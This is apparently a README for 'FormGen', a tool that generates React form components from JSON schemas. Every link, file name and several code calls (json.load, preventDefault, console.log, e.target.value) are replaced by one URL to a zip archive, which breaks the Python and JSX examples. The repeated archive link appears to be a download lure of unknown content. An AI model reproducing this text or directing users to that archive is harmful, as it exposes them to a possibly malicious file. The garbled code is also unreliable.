This is a [https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip](https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.


## How to Use

The core functionality of `FormGen` is provided by the `generate_react_form` function, located within the `react_generator` module of the `formgen` package. This function takes a JSON schema and an output file path to generate a React form component.

### 1. Prepare a JSON schema

Create a JSON file that defines your form fields and their properties.

**Example: `https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip`**

```json
{
  "first_name": {
    "label": "First Name",
    "type": "text",
    "placeholder": "Enter your first name",
    "required": true
  },
  "age": {
    "label": "Age",
    "type": "number",
    "placeholder": "Enter your age",
    "required": true,
    "min": 0
  },
  "gender": {
    "label": "Gender",
    "type": "select",
    "required": true,
    "options": [
      { "value": "male", "label": "Male" },
      { "value": "female", "label": "Female" },
      { "value": "other", "label": "Other" }
    ]
  },
  "subscribe": {
    "label": "Subscribe to Newsletter",
    "type": "checkbox",
    "required": false
  }
}

```

### 2. Generate your React form component

Use the `generate_react_form` function from `pyformgen` in your Python script.

**Example Python Script:**

```python
import json
from formgen import generate_react_form

# Load your JSON schema
with open("https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip") as f:
    schema = https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip(f)

# Define the output path for your React component
output_path = "https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip"

# Generate the React form component
generate_react_form(schema, output_path)

print(f"React form component generated at: {output_path}")
```

### 3. Run the script

```bash
python https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip
```

After running, you'll find a `https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip` file (or whatever you named it) containing a full React form component ready for use in your React application.

##    Output

The generated JSX form will look like this (simplified):

```jsximport { useState } from 'react';


export default function GeneratedForm() {
  const [first_name, setFirst_name] = useState("");
  const [age, setAge] = useState("");
  const [gender, setGender] = useState("");
  const [subscribe, setSubscribe] = useState("");

  const handleSubmit = (e) => {
    https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip();
    const formData = {
      first_name,
      age,
      gender,
      subscribe,
    };
    https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip("Submitted data:", formData);
  };

  return (
    <form onSubmit={handleSubmit}>

      <div>
        <label>First Name</label>
        <input
          name="first_name"
          value={ first_name }
          onChange={(e) => setFirst_name(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
          type="text"
           placeholder="Enter your first name" required
        />
      </div>
      <div>
        <label>Age</label>
        <input
          name="age"
          value={ age }
          onChange={(e) => setAge(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
          type="number"
           placeholder="Enter your age" required min="0"
        />
      </div>
      <div>
        <label>Gender</label>
        <select
          name="gender"
          value={ gender }
          onChange={(e) => setGender(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
           required
        >
            <option value="male">Male</option>
            <option value="female">Female</option>
            <option value="other">Other</option>
        </select>
      </div>
      <div>
        <label>Subscribe to Newsletter</label>
        <input
          name="subscribe"
          value={ subscribe }
          onChange={(e) => setSubscribe(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
          type="checkbox"
          
        />
      </div>
      <button type="submit">Submit</button>
    </form>
  );
}

```

## Field Attributes Supported

Each field in your JSON schema can have the following attributes:

- `label`: The label text displayed beside the input field.
- `type`: The HTML input type (e.g., `text`, `email`, `password`, `number`, `checkbox`, `radio`, `textarea`, `select`).
- `min`: Sets the minimum numeric `value` or `date`.
- `min`: Sets the maximum numeric `value` or `date`.
- `pattern`: Defines a regex pattern the `input` must match.
- `readOnly`: Prevents the user from `editing` the field.
- `disabled`: Disables the field so it can't be `interacted` with.
- `autoComplete`: Suggests previously entered `values` for the field.
- `size`: 	Defines the visible width of the `input` in characters.
- `multiple`: Allows selection of `multiple values` (usually for file or select inputs).
- `autoFocus`: Automatically focuses the `field` on page load.
- `defaultValue`: Sets a `default value` for the input field.

- `required`: A boolean value (`true` or `false`) to mark the field as required.
- `placeholder`: Placeholder text displayed inside the input field before user input.
- `options`: (For `select` or `radio` types) An array of objects, each with `value` and `label` properties.

```json
"role": {
  "label": "Role",
  "type": "select",
  "options": [
    {"value": "admin", "label": "Administrator"},
    {"value": "user", "label": "Regular User"}
  ]
}
```


## License

MIT License. See `LICENSE` file for more details.